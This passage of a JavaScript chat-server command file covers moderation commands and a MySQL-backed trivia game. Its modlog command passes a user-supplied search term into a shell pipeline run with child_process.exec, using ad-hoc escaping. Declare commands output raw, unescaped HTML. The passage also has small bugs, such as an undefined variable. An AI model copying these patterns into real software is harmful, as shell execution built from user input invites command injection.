		this.addModCommand(targetUser.name+" was permanently banned by "+user.name+".");
		targetUser.ban();
		ipbans.write('\n'+targetUser.latestIp);
	},
	
	flogout: 'forcelogout',
	forcelogout: function(target, room, user) {
		if(!user.can('hotpatch')) return;
		if (!this.canTalk()) return false;

		if (!target) return this.sendReply('/forcelogout [username], [reason] OR /flogout [username], [reason] - You do not have to add a reason');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}

		if (targetUser.can('hotpatch')) return this.sendReply('You cannot force logout another Admin.');

		this.addModCommand(''+targetUser.name+' was forcibly logged out by '+user.name+'.' + (target ? " (" + target + ")" : ""));
		
		this.logModCommand(user.name+' forcibly logged out '+targetUser.name);
		
		targetUser.resetName();
	},

	/*********************************************************
	 * Moderating: Other
	 *********************************************************/

	modnote: function(target, room, user, connection, cmd) {
		if (!target) return this.parse('/help note');
		if (!this.can('mute')) return false;
		return this.privateModCommand('(' + user.name + ' notes: ' + target + ')');
	},

	demote: 'promote',
	promote: function(target, room, user, connection, cmd) {
		if (!target) return this.parse('/help promote');
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var userid = toUserid(this.targetUsername);
		var name = targetUser ? targetUser.name : this.targetUsername;

		var currentGroup = ' ';
		if (targetUser) {
			currentGroup = targetUser.group;
		} else if (Users.usergroups[userid]) {
			currentGroup = Users.usergroups[userid].substr(0,1);
		}

		var nextGroup = target ? target : Users.getNextGroupSymbol(currentGroup, cmd === 'demote', true);
		if (target === 'deauth') nextGroup = config.groupsranking[0];
		if (!config.groups[nextGroup]) {
			return this.sendReply('Group \'' + nextGroup + '\' does not exist.');
		}
		if (!user.checkPromotePermission(currentGroup, nextGroup)) {
			return this.sendReply('/' + cmd + ' - Access denied.');
		}

		var isDemotion = (config.groups[nextGroup].rank < config.groups[currentGroup].rank);
		if (!Users.setOfflineGroup(name, nextGroup)) {
			return this.sendReply('/promote - WARNING: This user is offline and could be unregistered. Use /forcepromote if you\'re sure you want to risk it.');
		}
		var groupName = (config.groups[nextGroup].name || nextGroup || '').trim() || 'a regular user';
		if (isDemotion) {
			this.privateModCommand('('+name+' was demoted to ' + groupName + ' by '+user.name+'.)');
			if (targetUser) {
				targetUser.popup('You were demoted to ' + groupName + ' by ' + user.name + '.');
			}
			if (Rooms.rooms.logroom) Rooms.rooms.logroom.addRaw('DEMOTE LOG: ' + user.name + ' has demoted ' + name + ' to ' + groupName + '.');
		} else {
			this.addModCommand(''+name+' was promoted to ' + groupName + ' by '+user.name+'.');
			if (Rooms.rooms.logroom) Rooms.rooms.logroom.addRaw('PROMOTE LOG: ' + user.name + ' has promoted ' + name + ' to ' + groupName + '.');
		}
		if (targetUser) {
			targetUser.updateIdentity();
		}
	},

	forcepromote: function(target, room, user) {
		// warning: never document this command in /help
		if (!this.can('forcepromote')) return false;
		var target = this.splitTarget(target, true);
		var name = this.targetUsername;
		var nextGroup = target ? target : Users.getNextGroupSymbol(' ', false);

		if (!Users.setOfflineGroup(name, nextGroup, true)) {
			return this.sendReply('/forcepromote - Don\'t forcepromote unless you have to.');
		}
		var groupName = config.groups[nextGroup].name || nextGroup || '';
		this.addModCommand(''+name+' was promoted to ' + (groupName.trim()) + ' by '+user.name+'.');
	},
	
	regular: 'deuath',
	deauth: function(target, room, user) {
		return this.parse('/demote '+target+', deauth');
	},

	modchat: function(target, room, user) {
		if (!target) {
			return this.sendReply('Moderated chat is currently set to: '+room.modchat);
		}
		if (!this.can('modchat', null, room)) return false;
		if (room.modchat && config.groupsranking.indexOf(room.modchat) > 1 && !user.can('modchatall', null, room)) {
			return this.sendReply('/modchat - Access denied for removing a setting higher than ' + config.groupsranking[1] + '.');
		}

		target = target.toLowerCase();
		switch (target) {
		case 'on':
		case 'true':
		case 'yes':
		case 'registered':
			this.sendReply("Modchat registered is no longer available.");
			return false;
			break;
		case 'off':
		case 'false':
		case 'no':
			room.modchat = false;
			break;
		default:
			if (!config.groups[target]) {
				return this.parse('/help modchat');
			}
			if (config.groupsranking.indexOf(target) > 1 && !user.can('modchatall', null, room)) {
				return this.sendReply('/modchat - Access denied for setting higher than ' + config.groupsranking[1] + '.');
			}
			room.modchat = target;
			break;
		}
		if (room.modchat === true) {
			this.add('|raw|<div class="broadcast-red"><b>Moderated chat was enabled!</b><br />Only registered users can talk.</div>');
		} else if (!room.modchat) {
			this.add('|raw|<div class="broadcast-blue"><b>Moderated chat was disabled!</b><br />Anyone may talk now.</div>');
		} else {
			var modchat = sanitize(room.modchat);
			this.add('|raw|<div class="broadcast-red"><b>Moderated chat was set to '+modchat+'!</b><br />Only users of rank '+modchat+' and higher can talk.</div>');
		}
		this.logModCommand(user.name+' set modchat to '+room.modchat);
	},

	spop: 'sendpopup',
	sendpopup: function(target, room, user) {
		if (!this.can('hotpatch')) return false;
		
		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply('/sendpopup [user], [message] - You missed the user');
		if (!target) return this.sendReply('/sendpopup [user], [message] - You missed the message');

		targetUser.popup(target);
		this.sendReply(targetUser.name + ' got the message as popup: ' + target);
		
		targetUser.send(user.name+' sent a popup message to you.');
		
		this.logModCommand(user.name+' send a popup message to '+targetUser.name);
	},

	declare: function(target, room, user) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.add('|raw|<div class="broadcast-blue"><b>'+target+'</b></div>');
		this.logModCommand(user.name+' declared '+target);
	},

	declaregreen: 'declarered',
	declarered: function(target, room, user, connection, cmd) {
		if (!target) return this.parse('/help declare');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		if (cmd === 'declarered'){
			this.add('|raw|<div class="broadcast-red"><b>'+target+'</b></div>');
		}
		else if (cmd === 'declaregreen'){
			this.add('|raw|<div class="broadcast-green"><b>'+target+'</b></div>');
		}
		this.logModCommand(user.name+' declared '+target);
	},

	gdeclarered: 'gdeclare',
	gdeclaregreen: 'gdeclare',
	gdeclare: function(target, room, user, connection, cmd) {
		if (!target) return this.parse('/help gdeclare');
		if (!this.can('lockdown')) return false;

		var roomName = (room.isPrivate)? 'a private room' : room.id;

		if (cmd === 'gdeclare'){
			for (var id in Rooms.rooms) {
				if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-blue"><b><font size=1><i>Global declare from '+roomName+'<br /></i></font size>'+target+'</b></div>');
			}
		}
		if (cmd === 'gdeclarered'){
			for (var id in Rooms.rooms) {
				if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-red"><b><font size=1><i>Global declare from '+roomName+'<br /></i></font size>'+target+'</b></div>');
			}
		}
		else if (cmd === 'gdeclaregreen'){
			for (var id in Rooms.rooms) {
				if (id !== 'global') Rooms.rooms[id].addRaw('<div class="broadcast-green"><b><font size=1><i>Global declare from '+roomName+'<br /></i></font size>'+target+'</b></div>');
			}
		}
		this.logModCommand(user.name+' globally declared '+target);
	},

	modmsg: 'declaremod',
	moddeclare: 'declaremod',
	declaremod: function(target, room, user) {
		if (!target) return this.sendReply('/declaremod [message] - Also /moddeclare and /modmsg');
		if (!this.can('declare', null, room)) return false;

		if (!this.canTalk()) return;

		this.privateModCommand('|raw|<div class="broadcast-red"><b><font size=1><i>Private Auth (Driver +) declare from '+user.name+'<br /></i></font size>'+target+'</b></div>');

		this.logModCommand(user.name+' mod declared '+target);
	},


	wall: 'announce',
	announce: function(target, room, user) {
		if (!target) return this.parse('/help announce');

		if (!this.can('announce', null, room)) return false;

		target = this.canTalk(target);
		if (!target) return;

		return '/announce '+target;
	},

	fr: 'forcerename',
	forcerename: function(target, room, user) {
		if (!target) return this.parse('/help forcerename');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('forcerename', targetUser)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('You cannot forcerename this user.');

		if (targetUser.userid === toUserid(this.targetUser)) {
			var entry = ''+targetUser.name+' was forced to choose a new name by '+user.name+'' + (target ? ": " + target + "" : "");
			this.privateModCommand('(' + entry + ')');
			targetUser.resetName();
			targetUser.send('|nametaken||'+user.name+" has forced you to change your name. "+target);
		} else {
			this.sendReply("User "+targetUser.name+" is no longer using that name.");
		}
	},

	frt: 'forcerenameto',
	forcerenameto: function(target, room, user) {
		if (!target) return this.parse('/help forcerenameto');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!target) {
			return this.sendReply('No new name was specified.');
		}
		if (!this.can('forcerenameto', targetUser)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('You cannot forcerename this user.');

		if (targetUser.userid === toUserid(this.targetUser)) {
			var entry = ''+targetUser.name+' was forcibly renamed to '+target+' by '+user.name+'.';
			this.privateModCommand('(' + entry + ')');
			targetUser.forceRename(target, undefined, true);
		} else {
			this.sendReply("User "+targetUser.name+" is no longer using that name.");
		}
	},

	modlog: function(target, room, user, connection) {
		if (!this.can('modlog')) return false;
		var lines = 0;
		if (!target.match('[^0-9]')) {
			lines = parseInt(target || 15, 10);
			if (lines > 100) lines = 100;
		}
		var filename = 'logs/modlog.txt';
		var command = 'tail -'+lines+' '+filename;
		var grepLimit = 100;
		if (!lines || lines < 0) { // searching for a word instead
			if (target.match(/^["'].+["']$/)) target = target.substring(1,target.length-1);
			command = "awk '{print NR,$0}' "+filename+" | sort -nr | cut -d' ' -f2- | grep -m"+grepLimit+" -i '"+target.replace(/\\/g,'\\\\\\\\').replace(/["'`]/g,'\'\\$&\'').replace(/[\{\}\[\]\(\)\$\^\.\?\+\-\*]/g,'[$&]')+"'";
		}

		require('child_process').exec(command, function(error, stdout, stderr) {
			if (error && stderr) {
				connection.popup('/modlog erred - modlog does not support Windows');
				console.log('/modlog error: '+error);
				return false;
			}
			if (lines) {
				if (!stdout) {
					connection.popup('The modlog is empty. (Weird.)');
				} else {
					connection.popup('Displaying the last '+lines+' lines of the Moderator Log:\n\n'+stdout);
				}
			} else {
				if (!stdout) {
					connection.popup('No moderator actions containing "'+target+'" were found.');
				} else {
					connection.popup('Displaying the last '+grepLimit+' logged actions containing "'+target+'":\n\n'+stdout);
				}
			}
		});
	},

	bw: 'banword',
	banword: function(target, room, user) {
		if (!this.can('declare')) return false;
		target = toId(target);
		if (!target) {
			return this.sendReply('Specify a word or phrase to ban.');
		}
		Users.addBannedWord(target);
		this.sendReply('Added \"'+target+'\" to the list of banned words.');
	},

	ubw: 'unbanword',
	unbanword: function(target, room, user) {
		if (!this.can('declare')) return false;
		target = toId(target);
		if (!target) {
			return this.sendReply('Specify a word or phrase to unban.');
		}
		Users.removeBannedWord(target);
		this.sendReply('Removed \"'+target+'\" from the list of banned words.');
	},

	abc123: function(target, room, user) {
		user.customClient = true;
	},

	/*********************************************************
	 * Trivia Commands
	 *********************************************************/
	//http://hastebin.com/kegihojuvu.xml and http://hastebin.com/hoxucehaba.coffee
	
	// /starttrivia allows you to announce to everyone that a trivia room is open!
	/*starttrivia: function(target, room, user) {
		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to announce trivia!');
		this.parse('/makechatroom trivia');
		return Rooms.lobby.addRaw('<div class="infobox"><b>Come join us for trivia!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div>');
	},
	
	
	 // /host displays the information on the current trivia host.
	 host: function(target, room, user, connection, cmd, message) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
	 	if (!this.canBroadcast()) return;
		
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		console.log(cmd + '; ' + message.substring(0,1));
		if (message.substring(0,1) === '!') {
		myconnection.query(
			'CALL get_scores (?)',
			[room.triviahost],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
				var getstats = result[0];
				var getfinal = getstats[0];
				if (!getfinal) {
					room.addRaw(room.triviahost+' currently has no trivia stats.  Why not give '+room.triviahost+' a merit?');
					return;
				} else {
					var triviaremaining = room.triviatotal - room.triviacount;
					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
					room.addRaw('<div class="infobox"><b>The current host is: </b>' + room.triviahost +
							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
							 '<br><b>Merits: </b>'+getfinal['merit'] +
							 '<br><b>Demerits: </b>'+getfinal['demerit'] +
							 '<br><b><i>Questions left: </i>'+triviaremaining+'</b></div>');
					}
				}
			}
		);
		} else {
				myconnection.query(
			'CALL get_scores (?)',
			[room.triviahost],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
				var getstats = result[0];
				var getfinal = getstats[0];
				if (!getfinal) {
					connection.sendTo(room, room.triviahost+' currently has no trivia stats.  Why not give '+room.triviahost+' a merit?');
					return;
				} else {
					var triviaremaining = room.triviatotal - room.triviacount;
					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
					connection.sendTo(room, '|raw|<div class="infobox"><b>The current host is: </b>' + room.triviahost +
							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
							 '<br><b>Merits: </b>'+getfinal['merit'] +
							 '<br><b>Demerits: </b>'+getfinal['demerit'] +
							 '<br><b><i>Questions left: </i>'+triviaremaining+'</b></div>');
					}
				}
			}
		);
		}
		myconnection.end();
	 },
	 
	 // /score is the same as /host except it allows you to pick any target, and won't tell you how many questions are left.
	 score: function(target, room, user, connection, cmd, message) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
	 	if (!this.canBroadcast()) return;
		if (!target) target = user.name;
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		console.log(cmd + '; ' + message.substring(0,1));
		if (message.substring(0,1) === '!') {
		myconnection.query(
			'CALL get_scores (?)',
			[target],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
				var getstats = result[0];
				var getfinal = getstats[0];
				if (!result[0]) {
					room.addRaw(targett+' currently has no trivia stats.');
					return;
				} else {
					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
					room.addRaw('<div class="infobox"><b>Name: </b>' + target +
							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
							 '<br><b>Merits: </b>'+getfinal['merit'] +
							 '<br><b>Demerits: </b>'+getfinal['demerit']);
					}
				}
			}
		);
		} else {
				myconnection.query(
			'CALL get_scores (?)',
			[target],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
				var getstats = result[0];
				var getfinal = getstats[0];
				if (!result[0]) {
					connection.sendTo(room, target+' currently has no trivia stats.');
					return;
				} else {
					queryResults = [getfinal['point'],getfinal['merit'],getfinal['demerit']];
					connection.sendTo(room, '|raw|<div class="infobox"><b>Name: </b>' + target +
							 '<br><b>Trivia Points: </b>'+getfinal['point'] +
							 '<br><b>Merits: </b>'+getfinal['merit'] +
							 '<br><b>Demerits: </b>'+getfinal['demerit']);
					}
				}
			}
		);
		}
		myconnection.end();
	},
	 
	 // /newhost assigns a new host to the trivia room!
	 newhost: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to assign a new trivia host.');
		if (!target) {
			target = user.name;
			var targetUser = Users.get(target);
			} else {
				var targetUser = Users.get(target);
				if (!targetUser) return this.sendReply('User '+target+' not found.');
				target = targetUser.name;
			}
		if (room.triviaqueue.length == 0) {
			room.triviahost = target;
			room.triviatotal = 10;
			room.triviacount = 0;
			targetUser.popup(user.name+' has made you the new trivia host.');
			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
			return this.add('|raw|<div class="infobox"><b>' + targetUser.name + '</b> has become the new trivia host.<br><br>' +
					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
					 );
		} else {
			var nexthost;
			var nohostsatall = false;
			do {
				if (room.triviaqueue.length == 0) {
				nohostsatall = true;
				break;
				}
				nexthost = Users.get(room.triviaqueue.shift());
				}
			while (!nexthost);
			if (nohostsatall) {
				nexthost = targetUser;
			} else {
				this.add('There are other hosts in the queue that need to go first. ' + targetUser.name + ' will be added to the queue.');
				room.triviaqueue.push(targetUser.name);
				this.add(targetUser.name+' has been added onto the trivia queue, and will be host in '+room.triviaqueue.length+' turn(s)');
			}
			this.add(''+nexthost.name+' is now the trivia host.  They have been given 10 questions to start.');
			room.triviatotal = 10;
			room.triviacount = 0;
			room.triviahost = nexthost.name;
			nexthost.popup('The queue has made you the new trivia host.');
			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
			return this.add('|raw|<div class="infobox"><b>' + nexthost.name + '</b> has become the new trivia host.<br><br>' +
					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
					 );
			}
	},
	
	// /ask asks a question!
	ask: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!(user.name === room.triviahost)) return this.sendReply('You are not the trivia host!');
		if (!target) return this.sendReply('Ask a trivia question by typing: /ask Question.');
		if (!(room.triviaquestion === '')) return this.sendReply('You have already asked a question!  Either declare a winner with: /right username, answer or cancel the question with /cancel answer.');

		var triviatemp = room.triviacount+1;
		
		room.triviaquestion = target.replace(/(<([^>]+)>)/ig,"");
		if (room.triviaquestion === '') return this.sendReply('You did not ask a question... somehow!  Seriously, you screwed this up something fierce.');

		return this.add('|raw|<div class="infobox"><b>Question #'+triviatemp+':</b><br><b>'+user.name+' asks:</b><br />' + room.triviaquestion + '</div>');
	},
	
	cq: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!this.canBroadcast()) return false;
		if (room.triviaquestion === '') return this.sendReplyBox('<b>There is no trivia question to answer at the moment.</b>');
		return this.sendReplyBox('<b>Question #'+(1+room.triviacount)+':</b><br><b>'+ room.triviahost +' asks:</b><br />' + room.triviaquestion + '</div>');
	},
	
	// /cancel allows you to stop a question that goes unanswered
	cancel: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!(user.name === room.triviahost)) return this.sendReply('You are not the trivia host!');
		if (room.triviaquestion === '') return this.sendReply('You do not have a question to cancel.');
		if (!target) return this.sendReply('Cancel a trivia question by typing: /cancel [answer].');
		
		room.triviaanswer = target.replace(/(<([^>]+)>)/ig,"");
		
		if (room.triviaanswer === '') return this.sendReply('You did not ask a question... somehow!  Seriously, you screwed this up something fierce.');
		
		room.triviaquestion = '';
		this.add('|raw|<div class="infobox">' +
			'<b>'+user.name+' has canceled the question.  The answer is:</b><br />' + room.triviaanswer + '</div>');

		room.triviacount = room.triviacount + 1;
		if (room.triviatotal <= room.triviacount) {
			if (room.triviaqueue.length == 0) {
				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
				room.triviahost = '';
				return false;
			} else {
			var nexthost;
			var nohostsatall = false;
			do {
				if (room.triviaqueue.length == 0) {
				nohostsatall = true;
				break;
				}
				nexthost = Users.get(room.triviaqueue.shift());
				}
			while (!nexthost);
			if (nohostsatall) {
				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
				room.triviahost = '';
				return false;
			}
			this.add(''+nexthost.name+' is now the trivia host.  They have been given 10 questions to start.');
			room.triviatotal = 10;
			room.triviacount = 0;
			room.triviahost = nexthost.name;
			nexthost.popup('The queue has made you the new trivia host.');
			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
			return this.add('|raw|<div class="infobox"><b>' + nexthost.name + '</b> has become the new trivia host.<br><br>' +
					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
					 );
			}
		}
	},
	
		// /answer allows you to end a question and give a user a point!
	answer: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!(user.name === room.triviahost)) return this.sendReply('You are not the trivia host!');
		if (room.triviaquestion === '') return this.sendReply('You do not have a question to cancel.');
		if (!target) return this.sendReply('Show an answer to a trivia question by typing: /answer [username], [answer].');
		var answ = this.splitTarget(target);
		if (!this.targetUser) return this.sendReply('That user does not exist.');
		if (this.targetUsername === user.name) return this.sendReply('You cannot give yourself points, cheater.');
		room.triviaanswer = answ.replace(/(<([^>]+)>)/ig,"");
		
		if (room.triviaanswer === '') return this.sendReply('You did not set an answer... somehow!  Seriously, you screwed this up something fierce.');
		
		room.triviaquestion = '';
		this.add('|raw|<div class="infobox">' +
			'<b>'+this.targetUsername+' has correctly answered the question.  The answer is:</b><br />' + room.triviaanswer + '</div>');
			
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		myconnection.query(
			'CALL add_point (?)',
			[this.targetUsername],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
					console.log('Point given to winner!');
				}
			}
		);
		myconnection.end();
			
		//this part sets the next host or ends the trivia if that's relevant
		room.triviacount = room.triviacount + 1;
		if (room.triviatotal <= room.triviacount) {
			if (room.triviaqueue.length == 0) {
				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
				room.triviahost = '';
				return false;
			} else {
			var nexthost;
			var nohostsatall = false;
			do {
				if (room.triviaqueue.length == 0) {
				nohostsatall = true;
				break;
				}
				nexthost = Users.get(room.triviaqueue.shift());
				}
			while (!nexthost);
			if (nohostsatall) {
				this.add('|raw|<b>'+room.triviahost+', thank you for hosting trivia!  Your question limit has been reached, and it is time to give a new player host.</b>');
				room.triviahost = '';
				return false;
			}
			this.add(''+nexthost.name+' is now the trivia host.  They have been given 10 questions to start.');
			room.triviatotal = 10;
			room.triviacount = 0;
			room.triviahost = nexthost.name;
			nexthost.popup('The queue has made you the new trivia host.');
			Rooms.lobby.addRaw('<div class="infobox"><b>A new round of trivia has started!</b><br><div class="notice"><button name="joinRoom" value="trivia">Click here to join the trivia room!</button></div></div');
			return this.add('|raw|<div class="infobox"><b>' + nexthost.name + '</b> has become the new trivia host.<br><br>' +
					 'Please use the following commands to ask, answer, and cancel questions:<br>' +
					 '<b>/ask [question]</b>: This will ask a question to the chat.  You have 10 questions by default.<br>' +
					 '<b>/answer [username], [answer]</b>: This will give a point to the user mentioned here and display the correct answer.<br>' +
					 '<b>/cancel [answer]</b>: If no one can answer your question, you can cancel the question here.  Please provide the correct answer as well.<br><br>' +
					 'Remember, voiced users and above can use /merit and /demerit to rank your ability as a host, so try your hardest!</div>'
					 );
			}
		}
	},
	
	// /addqueue allows you to queue people up to be hosts!
	addqueue: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to add users to the trivia queue.');
		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
		if (!target) {
			target = user.name;
			var targetUser = Users.get(target);
			} else {
				var targetUser = Users.get(target);
				if (!targetUser) return this.sendReply('User '+target+' not found.');
				target = targetUser.name;
			}
		room.triviaqueue.push(targetUser.name);
		return this.add(targetUser.name+' has been added onto the trivia queue, and will be host in '+room.triviaqueue.length+' turn(s)');
	},
	
	// /queue displays the queue.
	queue: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!this.canBroadcast()) return;
		if (room.triviaqueue.length == 0) return this.sendReplyBox('The current trivia queue is... empty!');
		var queuelist = '';
		for(var i=0;i<room.triviaqueue.length;i++){
			queuelist = queuelist + '<br>#' + (i+1) + ': ' + room.triviaqueue[i];
			}
		return this.sendReplyBox('The current trivia queue is: '+queuelist);
	},
	
	// /clearqueue removes all users from the queue.  
	clearqueue: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to clear the trivia queue.');
		room.triviaqueue = [];
		return this.add(user.name+' has cleared the trivia queue.');
	},
	
	// /rmqueue will remove a single user from all spots in the queue.
	rmqueue: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove a user from the trivia queue.');
		if (!target) {
			target = user.name;
		} else {
			var targetUser = Users.get(target);
			if (targetUser) target = targetUser.name;
			}
		for(var i=0;i<room.triviaqueue.length;i++){
			if (room.triviaqueue[i] === target) {
				room.triviaqueue.splice(i,1);
				this.add(target+' has been removed from #' + (i+1) + ' in the trivia queue.');
				i = i-1;
			}
		}
		return this.add(target+' has been removed from all spots in the trivia queue.');
	},
	
	// /merit reason will give a user one merit!
	merit: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('merit')) return this.sendReply('You need to be a voiced user (+) or above to grant merits or demerits.');
		if (!target) return this.sendReply('Give a merit by typing: /merit [reason].');
		if (user.name === room.triviahost) return this.sendReply('You cannot give yourself merits, cheater!');
		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
		
		var reason = target.replace(/(<([^>]+)>)/ig,"");
		if (reason === '') return this.sendReply('Give a merit by typing: /merit [reason].');
		this.add('|raw|<b>' +room.triviahost + ' has recieved a merit from ' + user.name + '!</b>  The reason is: ' + reason);
		
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		myconnection.query(
			'CALL add_merit (?)',
			[room.triviahost],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
					console.log('Merit given to host!');
				}
			}
		);
		myconnection.end();
		return false;		
	},
	
		// /demerit reason will give a user one demerit!
	demerit: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
		if (!user.can('merit')) return this.sendReply('You need to be a voiced user (+) or above to grant merits or demerits.');
		if (!target) return this.sendReply('Give a demerit by typing: /demerit [reason].');
		if (user.name === room.triviahost) return this.sendReply('You cannot give yourself demerits, and you don\'t suck.  :)');
		if (room.triviahost === '') return this.sendReply('There is no host at the moment.');
		
		var reason = target.replace(/(<([^>]+)>)/ig,"");
		if (reason === '') return this.sendReply('Give a merit by typing: /merit [reason].');
		this.add('|raw|<b>' +room.triviahost + ' has recieved a demerit from ' + user.name + '!</b>  The reason is: ' + reason);
		
		//mySQL initialize database
		//var sys = require('util');
		var mysql = require('mysql');
		var myconnection = mysql.createConnection({
				'host': 'localhost','user':mysqlName,'password':mysqlPass
			}
		);
		
		myconnection.connect();
		myconnection.query('USE trivia');	
		
		//mySQL function
		myconnection.query(
			'CALL add_demerit (?)',
			[room.triviahost],
			function(err, result) {
				if(err) {
					console.log(err);
					return;
				} else {
					console.log('Merit given to host!');
				}
			}
		);
		myconnection.end();
		return false;		
	},
	
	// /submerit will remove one merit!
	submerit: function(target, room, user) {
		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
